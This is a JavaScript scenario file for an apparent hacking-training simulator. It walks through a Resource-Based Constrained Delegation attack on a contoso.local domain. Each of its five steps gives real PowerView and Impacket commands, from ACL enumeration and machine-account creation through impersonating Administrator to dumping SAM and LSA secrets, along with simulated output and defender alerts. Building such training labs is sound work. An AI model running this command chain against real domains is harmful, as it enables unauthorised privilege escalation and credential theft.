export default {
  id: 'rbcd-attack',
  title: 'Resource-Based Constrained Delegation (RBCD)',
  description: 'Abuse Resource-Based Constrained Delegation by writing to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to impersonate privileged users.',
  difficulty: 'Advanced',
  mitreAttack: 'T1558.003',
  network: {
    attacker: { hostname: 'KALI-ATTACK', ip: '10.0.0.5' },
    target: { hostname: 'FILESERVER01', ip: '10.0.1.25' },
    dc: { hostname: 'DC01', ip: '10.0.1.10' },
    domain: 'contoso.local'
  },
  steps: [
    {
      id: 0,
      description: 'Check if we have write permissions to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on target computer.',
      expectedCommand: 'Get-DomainObjectAcl -Identity "FILESERVER01" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1104"}',
      expectedCommands: [
        'Get-DomainObjectAcl -Identity "FILESERVER01" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty"}',
        'powerview Get-DomainObjectAcl FILESERVER01'
      ],
      hintShort: 'Enumerate ACLs on FILESERVER01 computer object',
      hintFull: 'Use PowerView Get-DomainObjectAcl to check permissions on FILESERVER01',
      attackerOutput: [
        '',
        'AceQualifier           : AccessAllowed',
        'ObjectDN               : CN=FILESERVER01,CN=Computers,DC=contoso,DC=local',
        'ActiveDirectoryRights  : WriteProperty',
        'ObjectAceType          : msDS-AllowedToActOnBehalfOfOtherIdentity',
        'ObjectSID              : S-1-5-21-1234567890-1234567890-1234567890-1108',
        'InheritanceFlags       : None',
        'BinaryLength           : 56',
        'AceType                : AccessAllowedObject',
        'SecurityIdentifier     : S-1-5-21-1234567890-1234567890-1234567890-1104',
        'IdentityReferenceName  : john',
        '',
        '[!] VULNERABLE: john has WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity',
        '[*] Can configure RBCD to impersonate any user to FILESERVER01'
      ],
      serverOutput: [
        '[LDAP] ACL enumeration query from 10.0.0.5',
        '[LDAP] Target: CN=FILESERVER01,CN=Computers,DC=contoso,DC=local',
        '[SECURITY] Security descriptor accessed'
      ],
      delay: 150
    },
    {
      id: 1,
      description: 'Create a new computer account that we control to use for the delegation attack.',
      expectedCommand: 'impacket-addcomputer -computer-name FAKE$ -computer-pass FakePass123! -dc-ip 10.0.1.10 contoso.local/john:Password123!',
      hintShort: 'Add a new computer account to the domain',
      hintFull: 'Use impacket-addcomputer to create a computer account named FAKE$',
      lootToGrant: {
        creds: [
          {
            type: 'Computer Account',
            username: 'FAKE$',
            secret: 'FakePass123!'
          }
        ]
      },
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Successfully added machine account FAKE$ with password FakePass123!',
        '',
        '═══════════════════════════════════════════════════════════',
        'New Computer Account',
        '═══════════════════════════════════════════════════════════',
        'Computer Name: FAKE$',
        'Password     : FakePass123!',
        'DN           : CN=FAKE,CN=Computers,DC=contoso,DC=local',
        'SID          : S-1-5-21-1234567890-1234567890-1234567890-1115',
        '',
        '[✓] Computer account created successfully'
      ],
      serverOutput: [
        '[LDAP] Computer account creation request',
        '[LDAP] New computer: FAKE$',
        '[AD] Computer object added to domain',
        '[SECURITY] New computer account registered'
      ],
      delay: 150
    },
    {
      id: 2,
      description: 'Configure RBCD on FILESERVER01 to allow delegation from our controlled computer account.',
      expectedCommand: 'impacket-rbcd -delegate-from FAKE$ -delegate-to FILESERVER01$ -action write -dc-ip 10.0.1.10 contoso.local/john:Password123!',
      hintShort: 'Write RBCD delegation rights for FAKE$ on FILESERVER01',
      hintFull: 'Use impacket-rbcd with -action write to configure delegation',
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty',
        '[*] Delegation rights modified successfully!',
        '[*] FAKE$ can now impersonate users on FILESERVER01$',
        '',
        '═══════════════════════════════════════════════════════════',
        'Delegation Configuration',
        '═══════════════════════════════════════════════════════════',
        'Target Computer  : FILESERVER01$',
        'Allowed Accounts : FAKE$',
        'Delegation Type  : Resource-Based Constrained Delegation',
        '',
        '[✓] RBCD configured successfully!',
        '[*] Can now request service tickets as any user'
      ],
      serverOutput: [
        '[LDAP] Attribute modification: msDS-AllowedToActOnBehalfOfOtherIdentity',
        '[LDAP] Modified object: FILESERVER01$',
        '[SECURITY] Delegation configuration changed',
        '[WARNING] RBCD delegation rights granted',
        '[DEFENSE] ALERT: Unusual delegation configuration detected!'
      ],
      delay: 200
    },
    {
      id: 3,
      description: 'Use S4U2Self and S4U2Proxy to obtain a service ticket for Administrator to FILESERVER01.',
      expectedCommand: 'impacket-getST -spn cifs/FILESERVER01.contoso.local -impersonate administrator -dc-ip 10.0.1.10 contoso.local/FAKE$:FakePass123!',
      hintShort: 'Request a service ticket impersonating the administrator',
      hintFull: 'Use impacket-getST to impersonate administrator via S4U2Proxy',
      lootToGrant: {
        files: {
          'administrator.ccache': {
            content: '[Kerberos Ticket Cache]\n[Base64 Encoded TGS Ticket Data]'
          }
        },
        download: ['administrator.ccache']
      },
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Getting TGT for user FAKE$',
        '[*] Impersonating administrator',
        '[*] Requesting S4U2self for administrator',
        '[*] Requesting S4U2Proxy',
        '[*] Saving ticket in administrator.ccache',
        '',
        '═══════════════════════════════════════════════════════════',
        'Service Ticket Obtained',
        '═══════════════════════════════════════════════════════════',
        'Service Principal: cifs/FILESERVER01.contoso.local',
        'Impersonated User: administrator@contoso.local',
        'Ticket Saved To  : administrator.ccache',
        'Valid Until      : 2025-11-15 15:43:00',
        '',
        '[✓] Successfully obtained service ticket as administrator!',
        '[*] Export KRB5CCNAME=administrator.ccache to use ticket'
      ],
      serverOutput: [
        '[KDC] TGT request for FAKE$',
        '[KDC] S4U2Self request: FAKE$ requesting ticket for administrator',
        '[KDC] S4U2Proxy request: Requesting service ticket to FILESERVER01',
        '[KDC] Checking delegation rights on FILESERVER01',
        '[KDC] Delegation allowed via msDS-AllowedToActOnBehalfOfOtherIdentity',
        '[KDC] Issuing service ticket for cifs/FILESERVER01 as administrator',
        '[CRITICAL] Privileged service ticket issued via delegation!',
        '[DEFENSE] ALERT: S4U2Proxy delegation abuse detected!'
      ],
      delay: 250
    },
    {
      id: 4,
      description: 'Use the obtained ticket to access FILESERVER01 as Administrator and extract credentials.',
      expectedCommand: 'export KRB5CCNAME=administrator.ccache && impacket-secretsdump -k -no-pass FILESERVER01.contoso.local',
      expectedCommands: [
        'export KRB5CCNAME=administrator.ccache && impacket-secretsdump -k -no-pass FILESERVER01.contoso.local',
        'impacket-secretsdump -k -no-pass FILESERVER01.contoso.local'
      ],
      hintShort: 'Use the Kerberos ticket to dump secrets from FILESERVER01',
      hintFull: 'Export KRB5CCNAME and run impacket-secretsdump with -k flag',
      lootToGrant: {
        creds: [
          {
            type: 'Local Admin Hash',
            username: 'Administrator',
            secret: 'aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889'
          },
          {
            type: 'Service Account',
            username: 'svc_backup',
            secret: 'aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe'
          }
        ]
      },
      attackerOutput: [
        'Impacket v0.11.0 - Copyright 2023 Fortra',
        '',
        '[*] Using Kerberos authentication from ccache',
        '[*] Service RemoteRegistry is in stopped state',
        '[*] Starting service RemoteRegistry',
        '[*] Target system bootKey: 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d',
        '',
        '[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)',
        'Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::',
        'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        '',
        '[*] Dumping cached domain logon information (domain/username:hash)',
        'CONTOSO\\administrator:$DCC2$10240#administrator#e4e938d12fe5974dc42a90120bd9c90f',
        'CONTOSO\\svc_backup:$DCC2$10240#svc_backup#a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6',
        '',
        '[*] Dumping LSA Secrets',
        '[*] CONTOSO\\svc_backup',
        'aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe',
        '',
        '[✓] Successfully extracted credentials from FILESERVER01!',
        '[*] Local Administrator hash obtained',
        '[*] Service account credentials extracted',
        '',
        '═══════════════════════════════════════════════════════════',
        '  RBCD ATTACK COMPLETE',
        '═══════════════════════════════════════════════════════════',
        '  ✓ Identified write permissions on delegation attribute',
        '  ✓ Created controlled computer account',
        '  ✓ Configured RBCD on target',
        '  ✓ Obtained service ticket as administrator',
        '  ✓ Dumped credentials from target server',
        '═══════════════════════════════════════════════════════════'
      ],
      serverOutput: [
        '[FILESERVER01] Administrator access from 10.0.0.5',
        '[RPC] RemoteRegistry service started',
        '[RPC] SAM database accessed',
        '[RPC] LSA secrets extracted',
        '[CRITICAL] Credential dumping detected on FILESERVER01!',
        '[DEFENSE] ALERT: Suspicious administrative activity via Kerberos delegation!'
      ],
      delay: 300
    }
  ]
};
